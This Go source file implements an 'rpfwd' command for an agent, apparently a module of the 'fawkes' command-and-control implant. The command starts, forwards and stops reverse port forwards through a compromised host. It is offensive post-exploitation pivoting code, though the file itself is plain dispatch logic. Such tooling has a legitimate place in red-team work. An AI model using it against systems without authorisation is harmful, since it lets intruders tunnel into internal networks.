package commands

import (
	"encoding/json"
	"fmt"

	"fawkes/pkg/rpfwd"
	"fawkes/pkg/structs"
)

// rpfwdManagerInstance is set by main.go when the agent initializes.
var rpfwdManagerInstance *rpfwd.Manager

// SetRpfwdManager sets the rpfwd manager instance for the rpfwd command.
func SetRpfwdManager(mgr *rpfwd.Manager) {
	rpfwdManagerInstance = mgr
}

// GetRpfwdManager returns the rpfwd manager instance.
func GetRpfwdManager() *rpfwd.Manager {
	return rpfwdManagerInstance
}

// RpfwdCommand implements the rpfwd command
type RpfwdCommand struct{}

func (c *RpfwdCommand) Name() string {
	return "rpfwd"
}

func (c *RpfwdCommand) Description() string {
	return "Start or stop a reverse port forward through this agent"
}

func (c *RpfwdCommand) Execute(task structs.Task) structs.CommandResult {
	var params struct {
		Action      string `json:"action"`
		Port        int    `json:"port"`
		TargetIP    string `json:"target_ip"`
		TargetPort  int    `json:"target_port"`
		BindAddress string `json:"bind_address"`
	}

	if err := json.Unmarshal([]byte(task.Params), &params); err != nil {
		return errorf("Failed to parse parameters: %v", err)
	}

	if rpfwdManagerInstance == nil {
		return errorResult("rpfwd manager not initialized")
	}

	port := uint32(params.Port)

	switch params.Action {
	case "start":
		if err := rpfwdManagerInstance.Start(port); err != nil {
			return errorf("Failed to start rpfwd on port %d: %v", port, err)
		}
		return successf("[+] Reverse port forward started — listening on 0.0.0.0:%d", port)

	case "forward":
		if params.TargetIP == "" || params.TargetPort == 0 {
			return errorResult("target_ip and target_port are required for forward action")
		}
		targetAddr := fmt.Sprintf("%s:%d", params.TargetIP, params.TargetPort)
		bindAddr := params.BindAddress
		if bindAddr == "" {
			bindAddr = "0.0.0.0"
		}
		if err := rpfwdManagerInstance.StartForward(port, targetAddr, bindAddr); err != nil {
			return errorf("Failed to start forward on port %d: %v", port, err)
		}
		return successf("[+] Forward port forward started — %s:%d → %s", bindAddr, port, targetAddr)

	case "stop":
		if err := rpfwdManagerInstance.Stop(port); err != nil {
			return errorf("Failed to stop port forward on port %d: %v", port, err)
		}
		return successf("[+] Port forward on port %d stopped", port)

	default:
		return errorf("Unknown action: %s (use 'start', 'forward', or 'stop')", params.Action)
	}
}
